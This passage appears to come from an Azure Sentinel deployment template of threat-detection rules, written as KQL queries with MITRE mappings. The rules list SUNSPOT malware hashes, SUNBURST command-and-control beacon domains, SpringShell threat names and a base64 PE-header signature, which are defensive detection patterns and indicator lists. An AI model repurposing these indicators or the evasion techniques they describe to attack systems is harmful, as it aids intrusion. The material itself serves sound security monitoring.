          "query": "let queryperiod = 14d;\nlet queryfrequency = 2h;\nlet security_info_actions = dynamic([\"User registered security info\", \"User changed default security info\", \"User deleted security info\", \"Admin updated security info\", \"User reviewed security info\", \"Admin deleted security info\", \"Admin registered security info\"]);\nlet VIPUsers = (\n    IdentityInfo\n    | where TimeGenerated > ago(queryperiod)\n    | mv-expand AssignedRoles\n    | where AssignedRoles contains 'Admin'\n    | summarize by AccountUPN);\nAuditLogs\n| where TimeGenerated > ago(queryfrequency)\n| where Category =~ \"UserManagement\"\n| where ActivityDisplayName in (security_info_actions)\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"User\"\n      | extend TargetUserPrincipalName = tostring(TargetResource.userPrincipalName)\n  )\n| where TargetUserPrincipalName in~ (VIPUsers)\n// Uncomment the line below if you are experiencing high volumes of Target entities. If this is uncommented, the Target column will not be mapped to an entity.\n//| summarize Start=min(TimeGenerated), End=max(TimeGenerated), Actions = make_set(ResultReason, MaxSize=8), Targets=make_set(Target, MaxSize=256) by Initiator, IP, Result\n// Comment out this line below, if line above is used.\n| summarize Start=min(TimeGenerated), End=max(TimeGenerated), Actions = make_set(ResultReason, MaxSize=8) by InitiatingAppName, InitiatingAppServicePrincipalId, \nInitiatingUserPrincipalName, InitiatingAadUserId, InitiatingIpAddress, TargetUserPrincipalName, Result\n| extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1]), \nTargetName = iff(tostring(TargetUserPrincipalName) has \"[\", \"\", tostring(split(TargetUserPrincipalName,'@',0)[0])), TargetUPNSuffix = iff(tostring(TargetUserPrincipalName) has \"[\", \"\", tostring(split(TargetUserPrincipalName,'@',1)[0]))\n",
          "queryFrequency": "PT2H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "694c91ee-d606-4ba9-928e-405a2dd0ff0f",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "InitiatingAppName"
                },
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatingAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatingAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/23b21744-0a4c-4e08-8113-136a8c981cb2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/23b21744-0a4c-4e08-8113-136a8c981cb2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "NRT",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NRT Base64 Encoded Windows Process Command-lines",
          "description": "This detection identifies instances of a base64 encoded PE file header seen in the process command line parameter.",
          "severity": "Medium",
          "enabled": true,
          "query": "SecurityEvent\n | where EventID == 4688\n | where isnotempty(CommandLine)\n | where CommandLine contains \"TVqQAAMAAAAEAAA\"\n | extend HostName = tostring(split(Computer, '.', 0)[0]), DnsDomain = tostring(strcat_array(array_slice(split(Computer, '.'), 1, -1), '.'))\n",
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "tactics": [
            "Execution",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1059",
            "T1027",
            "T1140"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "c3e5dbaa-a540-408c-8b36-68bdfb3df088",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "SubjectAccount"
                },
                {
                  "identifier": "Name",
                  "columnName": "SubjectUserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "SubjectDomainName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/11f07d4f-b834-4512-ac88-790ad8563213')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/11f07d4f-b834-4512-ac88-790ad8563213')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SUNSPOT malware hashes",
          "description": "This query uses Microsoft Defender for Endpoint data to look for IoCs associated with the SUNSPOT malware shared by Crowdstrike.\nMore details: \n  - https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/ \n  - https://techcommunity.microsoft.com/t5/azure-sentinel/monitoring-your-software-build-process-with-azure-sentinel/ba-p/2140807",
          "severity": "Medium",
          "enabled": true,
          "query": "let SUNSPOT_Hashes = dynamic([\"c45c9bda8db1d470f1fd0dcc346dc449839eb5ce9a948c70369230af0b3ef168\", \"0819db19be479122c1d48743e644070a8dc9a1c852df9a8c0dc2343e904da389\"]);\nunion isfuzzy=true(\nDeviceEvents\n| where InitiatingProcessSHA256 in (SUNSPOT_Hashes)),\n(DeviceImageLoadEvents\n| where InitiatingProcessSHA256 in (SUNSPOT_Hashes))\n| extend timestamp=TimeGenerated\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1554"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "53e936c6-6c30-4d12-8343-b8a0456e8429",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingProcessAccountUpn"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatingProcessAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatingProcessAccountDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/38482eab-4841-4694-96ae-a5dd9b2cb091')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/38482eab-4841-4694-96ae-a5dd9b2cb091')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TEARDROP memory-only dropper",
          "description": "Identifies SolarWinds TEARDROP memory-only dropper IOCs in Window's defender Exploit Guard activity\nReferences:\n- https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\n- https://gist.github.com/olafhartong/71ffdd4cab4b6acd5cbcd1a0691ff82f",
          "severity": "High",
          "enabled": true,
          "query": "DeviceEvents\n| where ActionType has \"ExploitGuardNonMicrosoftSignedBlocked\"\n| where InitiatingProcessFileName has \"svchost.exe\" and FileName has \"NetSetupSvc.dll\"\n| extend HashAlgorithm = \"SHA1\"\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "Persistence",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1543",
            "T1059",
            "T1027"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "738702fd-0a66-42c7-8586-e30f0583f8fe",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingProcessAccountUpn"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatingProcessAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatingProcessAccountDomain"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "HashAlgorithm"
                },
                {
                  "identifier": "Value",
                  "columnName": "InitiatingProcessSHA1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/13869591-47f2-4474-a135-488e69057a6c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/13869591-47f2-4474-a135-488e69057a6c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Attempt to bypass conditional access rule in Microsoft Entra ID",
          "description": "Identifies an attempt to Bypass conditional access rule(s) in Microsoft Entra ID.\nThe ConditionalAccessStatus column value details if there was an attempt to bypass Conditional Access or if the Conditional access rule was not satisfied (ConditionalAccessStatus == 1).\nReferences:\nhttps://docs.microsoft.com/azure/active-directory/conditional-access/overview\nhttps://docs.microsoft.com/azure/active-directory/reports-monitoring/concept-sign-ins\nhttps://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-sign-ins-error-codes\nConditionalAccessStatus == 0 // Success\nConditionalAccessStatus == 1 // Failure\nConditionalAccessStatus == 2 // Not Applied\nConditionalAccessStatus == 3 // unknown",
          "severity": "Low",
          "enabled": true,
          "query": "let threshold = 1; // Modify this threshold value to reduce false positives based on your environment\nlet aadFunc = (tableName:string){\ntable(tableName)\n| where ConditionalAccessStatus == 1 or ConditionalAccessStatus =~ \"failure\"\n| mv-apply CAP = parse_json(ConditionalAccessPolicies) on (\n  project ConditionalAccessPoliciesName = CAP.displayName, result = CAP.result\n  | where result =~ \"failure\"\n)\n| extend DeviceDetail = todynamic(DeviceDetail), Status = todynamic(Status), LocationDetails = todynamic(LocationDetails)\n| extend OS = DeviceDetail.operatingSystem, Browser = DeviceDetail.browser\n| extend State = tostring(LocationDetails.state), City = tostring(LocationDetails.city), Region = tostring(LocationDetails.countryOrRegion)\n| extend StatusCode = tostring(Status.errorCode), StatusDetails = tostring(Status.additionalDetails)\n| extend Status = strcat(StatusCode, \": \", ResultDescription)\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), Status = make_list(Status,10), StatusDetails = make_list(StatusDetails,50), IPAddresses = make_list(IPAddress,100), IPAddressCount = dcount(IPAddress), CorrelationIds = make_list(CorrelationId,100), ConditionalAccessPoliciesName = make_list(ConditionalAccessPoliciesName,100)\nby UserPrincipalName, UserId, AppDisplayName, tostring(Browser), tostring(OS), City, State, Region, Type\n| where IPAddressCount > threshold and StatusDetails !has \"MFA successfully completed\"\n| mv-expand IPAddresses, Status, StatusDetails, CorrelationIds\n| extend Status = strcat(Status, \" \", StatusDetails)\n| summarize IPAddresses = make_set(IPAddresses,100), Status = make_set(Status,10), CorrelationIds = make_set(CorrelationIds,100), ConditionalAccessPoliciesName = make_set(ConditionalAccessPoliciesName,100)\nby StartTime, EndTime, UserPrincipalName, UserId, AppDisplayName, tostring(Browser), tostring(OS), City, State, Region, IPAddressCount, Type\n| extend IPAddressFirst = tostring(IPAddresses[0]), Name = tostring(split(UserPrincipalName, \"@\")[0]), UPNSuffix = tostring(split(UserPrincipalName, \"@\")[1])\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Persistence"
          ],
          "techniques": [
            "T1078",
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "3af9285d-bb98-4a35-ad29-5ea39ba0c628",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "UserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddressFirst"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.7"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8b8cd7fc-477d-495f-9b7a-1d8a904a0133')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8b8cd7fc-477d-495f-9b7a-1d8a904a0133')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SUNBURST network beacons",
          "description": "Identifies SolarWinds SUNBURST domain beacon IOCs in DeviceNetworkEvents\nReferences:\n- https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\n- https://gist.github.com/olafhartong/71ffdd4cab4b6acd5cbcd1a0691ff82f",
          "severity": "Medium",
          "enabled": true,
          "query": "let SunburstURL=dynamic([\"panhardware.com\",\"databasegalore.com\",\"avsvmcloud.com\",\"freescanonline.com\",\"thedoccloud.com\",\"deftsecurity.com\"]);\nDeviceNetworkEvents\n| where ActionType == \"ConnectionSuccess\"\n| where RemoteUrl in(SunburstURL)\n| extend HashAlgorithm = 'MD5'\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "Persistence",
            "InitialAccess"
          ],
          "techniques": [
            "T1195",
            "T1059",
            "T1546"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "ce1e7025-866c-41f3-9b08-ec170e05e73e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingProcessAccountUpn"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatingProcessAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatingProcessAccountDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "RemoteIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "RemoteUrl"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "HashAlgorithm"
                },
                {
                  "identifier": "Value",
                  "columnName": "InitiatingProcessMD5"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/e1e4cb34-c981-4510-ac17-f8e0d390f5ca')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/e1e4cb34-c981-4510-ac17-f8e0d390f5ca')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "AV detections related to SpringShell Vulnerability",
          "description": "This query looks for Microsoft Defender AV detections related to the SpringShell vulnerability. In Microsoft Sentinel, the SecurityAlerts table includes only the Device Name of the affected device.\n  This query joins the DeviceInfo table to clearly connect other information such as device group, IP, logged-on users, etc. This would allow the Microsoft Sentinel analyst to have more context related to the alert, if available.\n  Reference: https://www.microsoft.com/security/blog/2022/04/04/springshell-rce-vulnerability-guidance-for-protecting-against-and-detecting-cve-2022-22965/",
          "severity": "High",
          "enabled": true,
          "query": "let SpringShell_threats = dynamic([\"Trojan:Python/SpringShellExpl\", \"Exploit:Python/SpringShell\", \"Backdoor:PHP/Remoteshell.V\", \"SpringShell\"]);\nDeviceInfo\n| extend DeviceName = tolower(DeviceName)\n| join kind=inner ( SecurityAlert\n| where ProviderName =~ \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| extend ThreatFamilyName = tostring(parse_json(ExtendedProperties).ThreatFamilyName)\n| where ThreatName in~ (SpringShell_threats) or ThreatFamilyName in~ (SpringShell_threats)\n| extend CompromisedEntity = tolower(CompromisedEntity)\n) on $left.DeviceName == $right.CompromisedEntity\n| summarize by DisplayName, ThreatName, ThreatFamilyName, PublicIP, AlertSeverity, Description, tostring(LoggedOnUsers), DeviceId, TenantId , bin(TimeGenerated, 1d), CompromisedEntity, tostring(LoggedOnUsers), ProductName, Entities\n| extend HostName = tostring(split(CompromisedEntity, \".\")[0]), DomainIndex = toint(indexof(CompromisedEntity, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(CompromisedEntity, DomainIndex + 1), CompromisedEntity)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1190"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "3bd33158-3f0b-47e3-a50f-7c20a1b88038",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "CompromisedEntity"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "PublicIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/356f2a24-bbc2-4aa1-b792-ea0ddbd0da80')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/356f2a24-bbc2-4aa1-b792-ea0ddbd0da80')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential Build Process Compromise - MDE",
          "description": "The query looks for source code files being modified immediately after a build process is started. The purpose of this is to look for malicious code injection during the build process. This query uses Microsoft Defender for Endpoint telemetry.\nMore details: https://techcommunity.microsoft.com/t5/azure-sentinel/monitoring-the-software-supply-chain-with-azure-sentinel/ba-p/2176463",
          "severity": "Medium",
          "enabled": true,
          "query": "// How far back to look for events from\nlet timeframe = 1d;\n// How close together build events and file modifications should occur to alert (make this smaller to reduce FPs)\nlet time_window = 5m;\n// Edit this to include build processes used\nlet build_processes = dynamic([\"MSBuild.exe\", \"dotnet.exe\", \"VBCSCompiler.exe\"]);\n// Include any processes that you want to allow to edit files during/around the build process\nlet allow_list = dynamic([]);\nDeviceProcessEvents\n| where TimeGenerated > ago(timeframe)\n// Look for build process starts\n| where FileName has_any (build_processes)\n| summarize by BuildParentProcess=InitiatingProcessFileName, BuildProcess=FileName, BuildAccount = AccountName, DeviceName, BuildCommand=ProcessCommandLine, \ntimekey= bin(TimeGenerated, time_window), BuildProcessTime=TimeGenerated\n| join kind=inner(\nDeviceFileEvents\n| where TimeGenerated > ago(timeframe)\n| where InitiatingProcessFileName !in (allow_list)\n| where ActionType == \"FileCreated\"  or ActionType == \"FileModified\"\n// Look for code files, edit this to include file extensions used in build.\n| where FileName endswith \".cs\" or FileName endswith \".cpp\"\n| summarize by FileEditParentProcess=InitiatingProcessParentFileName, FileEditAccount = InitiatingProcessAccountName, FileEditDomain = InitiatingProcessAccountDomain, FileEditUpn = InitiatingProcessAccountUpn, \nDeviceName, FileEdited=FileName, FileEditProcess=InitiatingProcessFileName, timekey= bin(TimeGenerated, time_window), FileEditTime=TimeGenerated)\n// join where build processes and file modifications seen at same time on same host\non timekey, DeviceName\n// Limit to only where the file edit happens after the build process starts\n| where BuildProcessTime <= FileEditTime\n| summarize make_set(FileEdited), make_set(FileEditProcess) by timekey, DeviceName, BuildParentProcess, BuildProcess, FileEditAccount, FileEditDomain, FileEditUpn\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1554"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "1bf6e165-5e32-420e-ab4f-0da8558a8be2",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "FileEditUpn"
                },
                {
                  "identifier": "Name",
                  "columnName": "FileEditAccount"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "FileEditDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/1951f755-3b2a-4583-966d-67100fab651e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/1951f755-3b2a-4583-966d-67100fab651e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Threat Essentials - Mass Cloud resource deletions Time Series Anomaly",
          "description": "This query generates baseline pattern of cloud resource deletions by an user and generated anomaly when any unusual spike is detected.\nThese anomalies from unusual or privileged users could be an indication of cloud infrastructure take-down by an adversary ",
          "severity": "Medium",
          "enabled": true,
